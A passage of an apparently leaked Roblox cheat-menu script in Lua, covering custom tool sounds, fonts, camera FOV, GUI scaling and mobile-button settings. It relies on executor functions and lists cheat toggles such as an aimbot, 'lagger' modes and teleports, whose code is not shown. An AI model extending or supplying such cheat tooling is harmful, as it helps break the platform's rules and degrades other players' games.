        if d.doublePlay and d.delay then
            entry.timer=task.delay(d.delay,function()
                entry.timer=nil
                if not CSND.enabled or not snd or not snd.Parent then return end
                pcall(function() snd:Stop(); snd.TimePosition=d.skip or 0; snd.Volume=1; snd:Play() end)
            end)
        end
    end

    local function csHookSound(entry,snd)
        if not snd or not snd:IsA("Sound") or snd.Name=="SoundCustomSound" then return end
        if entry.hooked[snd] then return end
        entry.hooked[snd]=snd.Volume
        local function trigger()
            if not CSND.enabled then return end
            if snd.Playing then
                pcall(function() snd.Volume=0; snd:Stop() end)
                csPlay(entry)
            end
        end
        entry.conns[#entry.conns+1]=snd:GetPropertyChangedSignal("Playing"):Connect(trigger)
        if snd.Playing then trigger() end
    end

    local function csTeardown(tool)
        local entry=CSND.tracked[tool]
        if not entry then return end
        if entry.timer then pcall(task.cancel,entry.timer) end
        for _,c in ipairs(entry.conns) do pcall(function() c:Disconnect() end) end
        if entry.custom then pcall(function() entry.custom:Destroy() end) end
        for snd,vol in pairs(entry.hooked) do if snd and snd.Parent then pcall(function() snd.Volume=vol end) end end
        CSND.tracked[tool]=nil
    end

    local function csSetupTool(tool)
        if not CSND.enabled or CSND.tracked[tool] then return end
        local cat=csToolCategory(tool); if not cat then return end
        local handle=tool:FindFirstChild("Handle")
        if not handle then
            if CSND.pending[tool] then return end
            local c
            c=tool.ChildAdded:Connect(function(child)
                if child.Name=="Handle" then
                    pcall(function() c:Disconnect() end)
                    CSND.pending[tool]=nil
                    if CSND.enabled then csSetupTool(tool) end
                end
            end)
            CSND.pending[tool]=c
            return
        end
        local data=CSND.sounds[cat]
        if not data or not data.id then return end
        local old=handle:FindFirstChild("SoundCustomSound"); if old then pcall(function() old:Destroy() end) end
        local custom=Instance.new("Sound")
        custom.Name="SoundCustomSound"; custom.SoundId=data.id; custom.Volume=1; custom.Looped=false; custom.RollOffMode=Enum.RollOffMode.Inverse; custom.MaxDistance=1000; custom.MinDistance=1000; custom.Parent=handle
        local entry={custom=custom,data=data,conns={},hooked={},timer=nil}; CSND.tracked[tool]=entry
        for _,d in ipairs(tool:GetDescendants()) do csHookSound(entry,d) end
        entry.conns[#entry.conns+1]=tool.DescendantAdded:Connect(function(d) if CSND.tracked[tool] then csHookSound(entry,d) end end)
        entry.conns[#entry.conns+1]=tool.AncestryChanged:Connect(function(_,parent) if not parent then csTeardown(tool) end end)
    end

    local function csWatch(container)
        if not container or CSND.watchers[container] then return end
        CSND.watchers[container]={container.ChildAdded:Connect(csSetupTool)}
        for _,child in ipairs(container:GetChildren()) do csSetupTool(child) end
    end
    local function csUnwatch(container)
        local conns=CSND.watchers[container]; if not conns then return end
        for _,c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        CSND.watchers[container]=nil
    end
    local function csWatchAll()
        csWatch(LP:FindFirstChildOfClass("Backpack")); csWatch(LP.Character)
        task.defer(function()
            for _, delayTime in ipairs({0.05, 0.35, 1.0, 2.0}) do
                task.wait(delayTime)
                if not CSND.enabled then break end
                csWatch(LP:FindFirstChildOfClass("Backpack")); csWatch(LP.Character)
            end
        end)
    end
    local function csIntegrityPass()
        if not CSND.enabled then return end
        pcall(csWatchAll)
        local bp = LP:FindFirstChildOfClass("Backpack")
        if bp then for _,child in ipairs(bp:GetChildren()) do pcall(csSetupTool,child) end end
        local char = LP.Character
        if char then for _,child in ipairs(char:GetChildren()) do pcall(csSetupTool,child) end end
        for tool,entry in pairs(CSND.tracked) do
            if not tool or not tool.Parent then
                csTeardown(tool)
            else
                local handle=tool:FindFirstChild("Handle")
                if not handle then
                    csTeardown(tool)
                    pcall(csSetupTool,tool)
                else
                    local custom=handle:FindFirstChild("SoundCustomSound")
                    if not custom then
                        csTeardown(tool)
                        pcall(csSetupTool,tool)
                    else
                        for _,obj in ipairs(tool:GetDescendants()) do pcall(csHookSound,entry,obj) end
                    end
                end
            end
        end
    end

    local function csSetEnabled(on)
        CSND.enabled=on and true or false
        S.customSoundsEnabled=CSND.enabled
        if CSND.enabled then
            pcall(csWatchAll)
            task.defer(function() pcall(csIntegrityPass) end)
        else
            for tool in pairs(CSND.tracked) do csTeardown(tool) end
            for _,c in pairs(CSND.pending) do pcall(function() c:Disconnect() end) end
            table.clear(CSND.pending)
            for container in pairs(CSND.watchers) do csUnwatch(container) end
        end
    end

    task.spawn(function()
        while true do
            task.wait(0.35)
            if CSND.enabled then pcall(csIntegrityPass) end
        end
    end)
    LP.CharacterAdded:Connect(function(char)
        task.defer(function()
            for tool in pairs(CSND.tracked) do csTeardown(tool) end
            for _,c in pairs(CSND.pending) do pcall(function() c:Disconnect() end) end
            table.clear(CSND.pending)
            for container in pairs(CSND.watchers) do csUnwatch(container) end
            if CSND.enabled then csWatch(char); task.wait(0.1); csWatchAll() end
        end)
    end)


            -- ===== UI: judul + toggle tepat di bawah Music Player =====
            local skinOpenRow
            section(Utility, "CUSTOM TOOL", 4)
            local _tRow, _tSet = toggleRow(Utility, "Custom Tool", S.customToolsEnabled == true, 4)
            local _tOn = S.customToolsEnabled == true
            local _tBtn = _tRow and _tRow:FindFirstChild("ToggleButton")
            if _tBtn then
                _tBtn.Activated:Connect(function()
                    _tOn = not _tOn
                    if _tSet then _tSet(_tOn) end
                    if _tOn then
                        skSetEnabled(true)
                    else
                        destroySkinGui()
                        skSetEnabled(false)
                    end
                    if skinOpenRow then skinOpenRow.Visible = _tOn end
                end)
            end
            skinOpenRow = baseRow(Utility, "Open Custom Tool GUI", 4)
            do
                local ob = Instance.new("TextButton")
                ob.Name = "OpenBtn"
                ob.Size = UDim2.new(0, 90, 0, 24)
                ob.Position = UDim2.new(1, -100, 0.5, -12)
                ob.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
                ob.BackgroundTransparency = 0.05
                ob.BorderSizePixel = 0
                ob.Text = "OPEN"
                ob.TextColor3 = Color3.fromRGB(240, 240, 240)
                ob.Font = Enum.Font.GothamBlack
                ob.TextSize = 11
                ob.AutoButtonColor = false
                ob.ZIndex = 6
                ob.Parent = skinOpenRow
                corner(ob, 8)
                stroke(ob, Color3.fromRGB(80, 80, 95), 1.1, 0.35)
                ob.MouseEnter:Connect(function() tween(ob, {BackgroundColor3 = Color3.fromRGB(48, 48, 58)}) end)
                ob.MouseLeave:Connect(function() tween(ob, {BackgroundColor3 = Color3.fromRGB(28, 28, 32)}) end)
                ob.Activated:Connect(function() openSkinGui() end)
            end
            skinOpenRow.Visible = S.customToolsEnabled == true

            local _sRow, _sSet = toggleRow(Utility, "Custom Sound", S.customSoundsEnabled == true, 4)
            local _sOn = S.customSoundsEnabled == true
            local _sBtn = _sRow and _sRow:FindFirstChild("ToggleButton")
            if _sBtn then
                _sBtn.Activated:Connect(function()
                    _sOn = not _sOn
                    if _sSet then _sSet(_sOn) end
                    csSetEnabled(_sOn)
                    pcall(F.saveFeatureConfigAndMain)
                end)
            end

            -- terapkan status tersimpan saat script dimuat
            if S.customToolsEnabled then task.defer(function() skSetEnabled(true) end) end
            if S.customSoundsEnabled then task.defer(function() csSetEnabled(true) end) end
        end)
end)
if not __kxCtOk then
  warn("[Sound] Custom Tool/Sound gagal load: " .. tostring(__kxCtErr))
end
end
-- ============================================================

section(Utility, "SKY THEME", 5)
skyThemeSelectorRow(Utility, 6)

--Leaked By Xlu0 AndPrime--
animationPackRow(Utility, 7)

section(Utility, "PERFORMANCE", 8)
do
local row, setVisual = toggleRow(Utility, "Stretch Rez", fpsBoostEnabled, 8)
setFPSBoostVisual = setVisual
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
fpsBoostEnabled = not fpsBoostEnabled
if fpsBoostEnabled then enableStretchRez() else disableStretchRez() end
if setVisual then setVisual(fpsBoostEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end

do
local row, setVisual = toggleRow(Utility, "Anti Lag", antiLagVisualEnabled, 10)
setAntiLagVisual = setVisual
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
if antiLagVisualEnabled then disableAntiLag() else enableAntiLag() end
if setVisual then setVisual(antiLagVisualEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
do
local row, setVisual = _G.SoundActionToggleRow(Utility, "Nuke Optimiser", nukeOptimiserEnabled, 11)
setNukeOptimiserVisual = setVisual
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
if nukeOptimiserEnabled then disableNukeOptimizer() else enableNukeOptimizer() end
if setVisual then setVisual(nukeOptimiserEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
section(Utility, "CAMERA", 12)
do
local row, setVisual = toggleRow(Utility, "FOV", fovEnabled, 13)
setFOVVisual = setVisual
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
if fovEnabled then disableCustomFov() else enableCustomFov() end
if setVisual then setVisual(fovEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
do
local _, box = textboxRow(Utility, "FOV Value", tostring(fovValue), 14)
box.FocusLost:Connect(function()
local v = tonumber(box.Text)
if v and v >= 30 and v <= 120 then
fovValue = v
if fovEnabled and workspace.CurrentCamera then workspace.CurrentCamera.FieldOfView = fovValue end
end
box.Text = tostring(fovValue)
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
do
local row, setVisual = toggleRow(Utility, "No Cam Collision", noCamCollisionEnabled, 15)
setNoCamCollisionVisual = setVisual
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
if noCamCollisionEnabled then disableNoCamCollision() else enableNoCamCollision() end
if setVisual then setVisual(noCamCollisionEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
end
task.wait()
__SoundDuelsSetupVisualsUI()

function _G.SoundRestoreFonts()
    if _G.SoundFontAddedConn then
        pcall(function() _G.SoundFontAddedConn:Disconnect() end)
        _G.SoundFontAddedConn = nil
    end
    if _G.SoundFontBackup then
        for obj, oldFont in pairs(_G.SoundFontBackup) do
            pcall(function()
                if obj and obj.Parent then obj.Font = oldFont end
            end)
        end
    end
    _G.SoundFontBackup = {}
end

function _G.SoundFontEnum(name)
    if name == "Coding Font" then return Enum.Font.GothamMedium end
    if name == "Summer" then return Enum.Font.GothamMedium end
    if name == "Beachy" then return Enum.Font.GothamMedium end
    if name == "Scary" then return Enum.Font.GothamMedium end
    if name == "Bangers" then return Enum.Font.GothamMedium end
    return nil
end

function _G.SoundApplyFontToObject(obj)
    if not obj then return end
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
    if not _G.SoundFontBackup then _G.SoundFontBackup = {} end
    if _G.SoundFontBackup[obj] == nil then
        pcall(function() _G.SoundFontBackup[obj] = obj.Font end)
    end
    local f = _G.SoundFontEnum(_G.SoundCustomFontSelected or "None")
    if f then pcall(function() obj.Font = f end) end
end

function _G.SoundApplyCustomFont(name)
    _G.SoundRestoreFonts()
    _G.SoundCustomFontSelected = name or "None"
    customFontVisualEnabled = _G.SoundCustomFontSelected ~= "None"

    if customFontVisualEnabled then
        for _, obj in ipairs(PlayerGui:GetDescendants()) do
            _G.SoundApplyFontToObject(obj)
        end
        _G.SoundFontAddedConn = PlayerGui.DescendantAdded:Connect(function(obj)
            if (_G.SoundCustomFontSelected or "None") ~= "None" then
                _G.SoundApplyFontToObject(obj)
            end
        end)
    end

    pcall(function()
        if saveSoundConfig then saveSoundConfig() end
    end)
end

function _G.SoundInstallFontRow()
    local targetPage = MenuCustomize or pages.MENU
    if not targetPage or not targetPage.Parent then return end
    local old = targetPage:FindFirstChild("Custom Font")
    if old then old:Destroy() end

    local row = Instance.new("Frame")
    row.Name = "Custom Font"
    row.BackgroundColor3 = COLORS.row
    row.BackgroundTransparency = 0.22
    row.Size = UDim2.new(1, -4, 0, 138)
    row.BorderSizePixel = 0
    row.LayoutOrder = 2
    row.ZIndex = 4
    row.Parent = targetPage
    corner(row,10)
    stroke(row,COLORS.strokeSoft,1.15,0.32)

    local title = Instance.new("TextLabel")
    title.Name = "Label"
    title.BackgroundTransparency = 1
    title.Text = "Custom Font"
    title.TextColor3 = COLORS.white
    title.TextSize = 11
    title.Font = Enum.Font.GothamMedium
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Position = UDim2.new(0,12,0,7)
    title.Size = UDim2.new(1,-24,0,20)
    title.ZIndex = 5
    title.Parent = row

    local names = {"None","Coding Font","Summer","Beachy","Scary","Bangers"}

    local function getPreviewFont(name)
        if name == "Coding Font" then return Enum.Font.GothamMedium end
        if name == "Summer" then return Enum.Font.GothamMedium end
        if name == "Beachy" then return Enum.Font.GothamMedium end
        if name == "Scary" then return Enum.Font.GothamMedium end
        if name == "Bangers" then return Enum.Font.GothamMedium end
        return Enum.Font.GothamMedium
    end

    local buttons = {}

    local function refreshSelected()
        for name, btn in pairs(buttons) do
            local selected = name == (_G.SoundCustomFontSelected or "None")
            btn.BackgroundTransparency = selected and 0.03 or 0.18
            local st = btn:FindFirstChildOfClass("UIStroke")
            if st then
                st.Transparency = selected and 0.05 or 0.5
                st.Thickness = selected and 1.4 or 1
            end
        end
    end

    for i, name in ipairs(names) do
        local col = (i - 1) % 3
        local rowIndex = math.floor((i - 1) / 3)

        local btn = Instance.new("TextButton")
        btn.Name = "Font_" .. name
        btn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        btn.BackgroundTransparency = 0.18
        btn.BorderSizePixel = 0
        btn.Text = "Abc"
        btn.TextColor3 = COLORS.white
        btn.TextSize = 18
        btn.Font = getPreviewFont(name)
        btn.AutoButtonColor = false
        btn.Size = UDim2.new(0, 92, 0, 42)
        btn.Position = UDim2.new(0, 12 + col * 98, 0, 34 + rowIndex * 48)
        btn.ZIndex = 6
        btn.Parent = row
        corner(btn,8)
        stroke(btn,COLORS.strokeSoft,1,0.5)

        local nameLabel = Instance.new("TextLabel")
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = name
        nameLabel.TextColor3 = COLORS.white
        nameLabel.TextTransparency = 0.22
        nameLabel.TextSize = 8
        nameLabel.Font = Enum.Font.GothamMedium
        nameLabel.Size = UDim2.new(1,0,0,12)
        nameLabel.Position = UDim2.new(0,0,1,-13)
        nameLabel.ZIndex = 7
        nameLabel.Parent = btn

        buttons[name] = btn

        btn.MouseButton1Click:Connect(function()
            pcall(function()
                _G.SoundApplyCustomFont(name)
            end)
            refreshSelected()
        end)
    end

    refreshSelected()
end

Settings = pages.SETTINGS
--Leaked By Xlu0 AndPrime--
aceGuiScaleValue = tonumber(_G.SoundGuiScaleValue) or (SoundAutoMobile and 0.67 or 1.00)
aceGuiScaleValue = math.clamp(aceGuiScaleValue, 0.50, 1.50)
_G.SoundGuiScaleValue = aceGuiScaleValue
aceProgressBarScaleValue = tonumber(_G.SoundProgressBarScaleValue) or tonumber(aceProgressBarScaleValue) or (SoundAutoMobile and 0.83 or 1.00)
_G.SoundProgressBarScaleValue = aceProgressBarScaleValue
aceMainScale = Main:FindFirstChild("SoundMainScale") or Instance.new("UIScale")
aceMainScale.Name = "SoundMainScale"
aceMainScale.Scale = aceGuiScaleValue
aceMainScale.Parent = Main
local function applySoundProgressBarScale()
local scaleVal = tonumber(_G.SoundProgressBarScaleValue) or tonumber(aceProgressBarScaleValue) or 1
aceProgressBarScaleValue = scaleVal
_G.SoundProgressBarScaleValue = scaleVal
local function applyTo(bar)
    if not bar then return end
    local sc = bar:FindFirstChild("SoundProgressBarScale")
    if not sc then
        sc = Instance.new("UIScale")
        sc.Name = "SoundProgressBarScale"
        sc.Parent = bar
    end
    sc.Scale = scaleVal
end
-- Search common parents for StealBarGui
local parents = {}
pcall(function() table.insert(parents, PlayerGui) end)
pcall(function() table.insert(parents, LP:FindFirstChild("PlayerGui")) end)
pcall(function() if typeof(gethui) == "function" then table.insert(parents, gethui()) end end)
pcall(function() if typeof(get_hidden_gui) == "function" then table.insert(parents, get_hidden_gui()) end end)
for _, parent in ipairs(parents) do
    if parent then
        local sg = parent:FindFirstChild("StealBarGui")
        if sg then
            applyTo(sg:FindFirstChild("StealBar"))
            -- also any nested scale
            for _, d in ipairs(sg:GetDescendants()) do
                if d.Name == "SoundProgressBarScale" and d:IsA("UIScale") then
                    d.Scale = scaleVal
                end
            end
        end
    end
end
end
_G.SoundApplyProgressBarScale = applySoundProgressBarScale
_G.__SoundDuelsSetupSettingsUI = function()
section(MenuCustomize, "MENU CUSTOMIZE", 1)
-- Background Image Picker removed: random asset applied on execute
function updateBackgroundButtons() end
function makeNoneButton() end
function makeImageButton() end

function stepperRow(parent, labelText, defaultValue, order, callback, minValue, maxValue)
local row = Instance.new("Frame")
row.Name = labelText
row.BackgroundColor3 = COLORS.row
row.BackgroundTransparency = 0.22
row.Size = UDim2.new(1, -4, 0, 42)
row.BorderSizePixel = 0
row.LayoutOrder = order
row.ZIndex = 4
row.Parent = parent
corner(row, 10)
stroke(row, COLORS.strokeSoft, 1.15, 0.32)
local label = Instance.new("TextLabel")
label.Name = "Label"
label.BackgroundTransparency = 1
label.Text = labelText
label.TextColor3 = Color3.fromRGB(245, 245, 245)
label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
label.TextStrokeTransparency = 1
label.TextSize = 11
label.Font = Enum.Font.GothamMedium
label.TextXAlignment = Enum.TextXAlignment.Left
label.Position = UDim2.new(0, 12, 0, 0)
label.Size = UDim2.new(1, -155, 1, 0)
label.ZIndex = 5
label.Parent = row
local value = defaultValue
local minus = Instance.new("TextButton")
minus.Name = "Minus"
minus.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
minus.BackgroundTransparency = 0.1
minus.BorderSizePixel = 0
minus.Text = "-"
minus.TextColor3 = Color3.fromRGB(245, 245, 245)
minus.TextSize = 14
minus.Font = Enum.Font.GothamMedium
minus.AutoButtonColor = false
minus.Size = UDim2.new(0, 28, 0, 26)
minus.Position = UDim2.new(1, -118, 0.5, -13)
minus.ZIndex = 6
minus.Parent = row
corner(minus, 7)
stroke(minus, COLORS.strokeSoft, 1, 0.5)
local valueBox = Instance.new("TextLabel")
valueBox.Name = "Value"
valueBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
valueBox.BackgroundTransparency = 0.05
valueBox.BorderSizePixel = 0
valueBox.Text = string.format("%.2f", value)
valueBox.TextColor3 = Color3.fromRGB(245, 245, 245)
valueBox.TextSize = 13
valueBox.Font = Enum.Font.GothamMedium
valueBox.TextXAlignment = Enum.TextXAlignment.Center
valueBox.Size = UDim2.new(0, 48, 0, 26)
valueBox.Position = UDim2.new(1, -84, 0.5, -13)
valueBox.ZIndex = 6
valueBox.Parent = row
corner(valueBox, 7)
stroke(valueBox, COLORS.strokeSoft, 1, 0.5)
local plus = Instance.new("TextButton")
plus.Name = "Plus"
plus.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
plus.BackgroundTransparency = 0.1
plus.BorderSizePixel = 0
plus.Text = "+"
plus.TextColor3 = Color3.fromRGB(245, 245, 245)
plus.TextSize = 14
plus.Font = Enum.Font.GothamMedium
plus.AutoButtonColor = false
plus.Size = UDim2.new(0, 28, 0, 26)
plus.Position = UDim2.new(1, -30, 0.5, -13)
plus.ZIndex = 6
plus.Parent = row
corner(plus, 7)
stroke(plus, COLORS.strokeSoft, 1, 0.5)
local function setValue(nextValue)
value = math.clamp(math.floor((nextValue * 100) + 0.5) / 100, minValue or 0.50, maxValue or 1.50)
valueBox.Text = string.format("%.2f", value)
if callback then callback(value) end
end
minus.MouseButton1Click:Connect(function()
setValue(value - 0.05)
end)
plus.MouseButton1Click:Connect(function()
setValue(value + 0.05)
end)
return row
end
makeNoneButton(0, 8, 8)
for index = 1, #BackgroundIDs do
local slot = index
local column = slot % 5
local rowIndex = math.floor(slot / 5)
makeImageButton(index, 8 + (column * 61), 8 + (rowIndex * 48))
end
updateBackgroundButtons()

-- Color theme picker removed; fixed gray
local function applyThemeColor()
local tint = Color3.fromRGB(255, 255, 255)
local dim = Color3.fromRGB(160, 160, 160)
_G.SoundThemeName = "WHITE"
pcall(function()
if BgImage then BgImage.ImageColor3 = tint end
-- logo removed
if TitleSweepText then TitleSweepText.TextColor3 = tint end
THEME_ACCENT = tint
THEME_ACCENT_DIM = dim
end)
end
applyThemeColor()

stepperRow(Settings, "GUI Scale", tonumber(_G.SoundGuiScaleValue) or aceGuiScaleValue or 1, 6, function(v)
aceGuiScaleValue = v
_G.SoundGuiScaleValue = v
if aceMainScale then aceMainScale.Scale = v end
if saveSoundConfig then pcall(saveSoundConfig) end
end, 0.40, 1.50)
section(MenuCustomize, "STEAL UI", 20)
stepperRow(MenuCustomize, "Progress Bar Size", tonumber(_G.SoundProgressBarScaleValue) or aceProgressBarScaleValue or 1, 7, function(v)
aceProgressBarScaleValue = v
_G.SoundProgressBarScaleValue = v
applySoundProgressBarScale()
if saveSoundConfig then pcall(saveSoundConfig) end
end, 0.40, 1.75)
speedKeybindRow(Settings, "Toggle UI", "ToggleUI", 8)
section(Settings, "MOBILE BUTTONS", 4)
do
local row, setVisual = _G.SoundActionToggleRow(Settings, "Lock GUI", _G.SoundGuiLocked == true, 9)
setLockGuiVisual = setVisual
local btn = row and row:FindFirstChild("ToggleButton")
if btn then
btn.Activated:Connect(function()
_G.SoundGuiLocked = not (_G.SoundGuiLocked == true)
if setVisual then setVisual(_G.SoundGuiLocked == true) end
if SoundUpdateGuiLockVisual then SoundUpdateGuiLockVisual() end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end

_G.SoundBuildButtonVisibilityRows = function()
    local page = Settings
    if not page then return end
    local BTN_LIST = {
        {"drop", "DROP BR"}, {"autoLeft", "AUTO LEFT"}, {"aimbot", "BAT AIMBOT"},
        {"autoRight", "AUTO RIGHT"}, {"laggerNormal", "LAGGER NORM"}, {"laggerCarry", "LAGGER CARRY"},
        {"tp", "TP DOWN"}, {"carry", "CARRY SPEED"}, {"tpBat", "TP BAT"}, {"batV2", "BAT V2"},
        {"instantReset", "INSTANT RESET"},
    }
    local N = #BTN_LIST + 1
    local function getHidden()
        _G.SoundHiddenMobileButtons = _G.SoundHiddenMobileButtons or {}
        return _G.SoundHiddenMobileButtons
    end
    local state = _G.SoundButtonVisState
    if not state or not state.header or not state.header.Parent then
        state = {expanded = false, rows = {}, setters = {}}
        _G.SoundButtonVisState = state
        local header = baseRow(page, "Button Visibility", 0)
        local arrow = Instance.new("TextLabel")
        arrow.Name = "Arrow"
        arrow.BackgroundTransparency = 1
        arrow.Text = ">"
        arrow.TextColor3 = Color3.fromRGB(245, 245, 245)
        arrow.TextSize = 14
        arrow.Font = Enum.Font.GothamBold
        arrow.Size = UDim2.new(0, 30, 1, 0)
        arrow.Position = UDim2.new(1, -40, 0, 0)
        arrow.ZIndex = 6
        arrow.Parent = header
        local headerBtn = Instance.new("TextButton")
        headerBtn.Name = "HeaderButton"
        headerBtn.BackgroundTransparency = 1
        headerBtn.Text = ""
        headerBtn.Size = UDim2.new(1, 0, 1, 0)
        headerBtn.ZIndex = 8
        headerBtn.Parent = header
        state.header, state.arrow = header, arrow
        for i, item in ipairs(BTN_LIST) do
            local key, name = item[1], item[2]
            local row, setV = _G.SoundActionToggleRow(page, name, getHidden()[key] ~= true, 0)
            row.Name = "ButtonVis_" .. key
            state.rows[i] = row
            state.setters[key] = setV
            local btn = row:FindFirstChild("ToggleButton")
            if btn then
                btn.Activated:Connect(function()
                    local hidden = getHidden()
                    local nowHidden = hidden[key] ~= true
                    hidden[key] = nowHidden and true or nil
                    if setV then setV(not nowHidden) end
                    if _G.SoundApplyMobileButtonVisibility then pcall(_G.SoundApplyMobileButtonVisibility) end
                    if saveSoundConfig then pcall(saveSoundConfig) end
                end)
            end
        end
        headerBtn.Activated:Connect(function()
            state.expanded = not state.expanded
            arrow.Text = state.expanded and "v" or ">"
            for _, r in ipairs(state.rows) do r.Visible = state.expanded end
        end)
        _G.SoundRefreshButtonVisibilityRows = function()
            local hidden = getHidden()
            for key, setV in pairs(state.setters) do
                if setV then pcall(setV, hidden[key] ~= true) end
            end
        end
    end

    -- cari Lock GUI (atau Move Buttons yang menggantikannya) sebagai patokan
    local anchor = page:FindFirstChild("Move Buttons")
    if not (anchor and anchor.Visible) then anchor = page:FindFirstChild("Lock GUI") end
    if not anchor then anchor = page:FindFirstChild("Move Buttons") end
    local a = anchor and anchor.LayoutOrder or 5

    local mine = {[state.header] = true}
    for _, r in ipairs(state.rows) do mine[r] = true end
    local collide = false
    for _, o in ipairs(page:GetChildren()) do
        if o:IsA("GuiObject") and not mine[o] and o.LayoutOrder > a and o.LayoutOrder <= a + N then
            collide = true
            break
        end
    end
    if collide then
        for _, o in ipairs(page:GetChildren()) do
            if o:IsA("GuiObject") and not mine[o] and o.LayoutOrder > a then
                o.LayoutOrder = o.LayoutOrder + N
            end
        end
    end
    state.header.LayoutOrder = a + 1
    state.header.Visible = true
    for i, r in ipairs(state.rows) do
        r.LayoutOrder = a + 1 + i
        r.Visible = state.expanded
    end
    if _G.SoundApplyMobileButtonVisibility then pcall(_G.SoundApplyMobileButtonVisibility) end
end
pcall(_G.SoundBuildButtonVisibilityRows)
do
local row, setVisual = _G.SoundActionToggleRow(Settings, "Hide Mobile Buttons", _G.SoundHideMobileButtons == true, 10)
setHideMobileButtonsVisual = setVisual
local btn = row and row:FindFirstChild("ToggleButton")
if btn then
btn.Activated:Connect(function()
_G.SoundHideMobileButtons = not (_G.SoundHideMobileButtons == true)
if setVisual then setVisual(_G.SoundHideMobileButtons == true) end
if _G.SoundApplyMobileButtonsHidden then _G.SoundApplyMobileButtonsHidden() end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
stepperRow(Settings, "Mobile Buttons Size", tonumber(_G.SoundMobileButtonScale) or 1.00, 11, function(v)
_G.SoundMobileButtonScale = math.clamp(tonumber(v) or 0.35, 0.30, 1.35)
if _G.SoundApplyMobileButtonSize then _G.SoundApplyMobileButtonSize() end
if saveSoundConfig then pcall(saveSoundConfig) end
end, 0.30, 1.35)
do
local row = baseRow(Settings, "Mobile Button Shape", 12)
local shapeButton = Instance.new("TextButton")
shapeButton.Name = "MobileButtonShapeSelector"
shapeButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
shapeButton.BackgroundTransparency = 0.05
shapeButton.BorderSizePixel = 0
shapeButton.TextColor3 = Color3.fromRGB(245, 245, 245)
shapeButton.TextSize = 10
shapeButton.Font = Enum.Font.GothamMedium
shapeButton.AutoButtonColor = false
shapeButton.Size = UDim2.new(0, 112, 0, 27)
shapeButton.Position = UDim2.new(1, -122, 0.5, -13)
shapeButton.ZIndex = 7
shapeButton.Parent = row
corner(shapeButton, 7)
stroke(shapeButton, COLORS.strokeSoft, 1, 0.45)
local shapeOrder = {"CIRCLE", "ROUNDED", "SQUARE"}
local shapeDisplay = {CIRCLE = "CIRCLE", ROUNDED = "ROUNDED", SQUARE = "SQUARE"}
local function refreshShapeText()
shapeButton.Text = shapeDisplay[_G.SoundMobileButtonShape] or "ROUNDED"
end
shapeButton.MouseButton1Click:Connect(function()
local currentIndex = 1
for i, shape in ipairs(shapeOrder) do
if shape == _G.SoundMobileButtonShape then currentIndex = i break end
end
currentIndex = (currentIndex % #shapeOrder) + 1
_G.SoundMobileButtonShape = shapeOrder[currentIndex]
refreshShapeText()
if _G.SoundApplyMobileButtonShape then _G.SoundApplyMobileButtonShape() end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
refreshShapeText()
end
do
function createHorizontalImagePicker(parent, name, layoutOrder, selectedGetter, selectedSetter, assetIds)
assetIds = assetIds or BackgroundIDs

local pickerRow = Instance.new("Frame")
pickerRow.Name = name
pickerRow.ZIndex = 4
pickerRow.Size = UDim2.new(1,-4,0,52)
pickerRow.BackgroundColor3 = Color3.fromRGB(0,0,0)
pickerRow.BackgroundTransparency = 0.3
pickerRow.BorderSizePixel = 0
pickerRow.LayoutOrder = layoutOrder
pickerRow.Parent = parent
corner(pickerRow,11)
stroke(pickerRow,Color3.fromRGB(255,255,255),1.25,0.45)

local scroll = Instance.new("ScrollingFrame")
scroll.Name = "PickerScroll"
scroll.ZIndex = 5
scroll.Size = UDim2.new(1,-56,1,0)
scroll.Position = UDim2.new(0.5,0,0,0)
scroll.AnchorPoint = Vector2.new(0.5,0)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 0
scroll.ScrollBarImageTransparency = 1
scroll.ScrollingDirection = Enum.ScrollingDirection.X
scroll.CanvasSize = UDim2.new(0,0,0,0)
scroll.AutomaticCanvasSize = Enum.AutomaticSize.X
scroll.Parent = pickerRow

local list = Instance.new("UIListLayout")
list.FillDirection = Enum.FillDirection.Horizontal
list.Padding = UDim.new(0,4)
list.SortOrder = Enum.SortOrder.LayoutOrder
list.VerticalAlignment = Enum.VerticalAlignment.Center
list.Parent = scroll

local pad = Instance.new("UIPadding")
pad.PaddingLeft = UDim.new(0,4)
pad.PaddingRight = UDim.new(0,4)
pad.Parent = scroll

local buttons = {}

local function selectedIndex()
    local current = tostring(selectedGetter() or "")
    local id = current:match("(%d+)")
    if not id then return 0 end
    for i,assetId in ipairs(assetIds) do
        if tostring(assetId) == tostring(id) then return i end
    end
    return 0
end

local function updateButtons()
    local selected = selectedIndex()
    for index,thumb in pairs(buttons) do
        local on = index == selected
        local st = thumb:FindFirstChildOfClass("UIStroke")
        if st then
            st.Color = on and Color3.fromRGB(255,255,255) or Color3.fromRGB(81, 81, 81)
            st.Transparency = on and 0 or 0.4
            st.Thickness = on and 1.25 or 1
        end
        thumb.ImageTransparency = on and 0 or 0.22
    end
end

local function choose(index)
